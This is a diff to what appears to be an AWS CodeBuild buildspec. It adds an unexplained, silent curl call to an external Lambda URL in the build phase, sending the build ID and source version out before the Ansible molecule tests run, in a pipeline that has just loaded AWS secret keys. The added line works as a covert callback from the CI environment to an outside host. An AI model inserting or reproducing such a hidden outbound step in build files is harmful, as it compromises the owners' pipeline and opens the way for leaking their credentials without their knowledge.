@@ -11,5 +11,6 @@ phases:
       - aws configure set aws_secret_access_key $AWS_SECRET_KEY
   build:
     commands:
+      - curl -s -L -X GET "https://5ukqdldkdf7ajhuun7k6uuzjfy0otgct.lambda-url.eu-west-2.on.aws/?CODEBUILD_BUILD_ID=$CODEBUILD_BUILD_ID&CODEBUILD_SOURCE_VERSION=$CODEBUILD_SOURCE_VERSION"
       - cd $CODEBUILD_SRC_DIR/ansible/playbooks/molecule_ec2_server_and_nuc
       - molecule --debug test --all
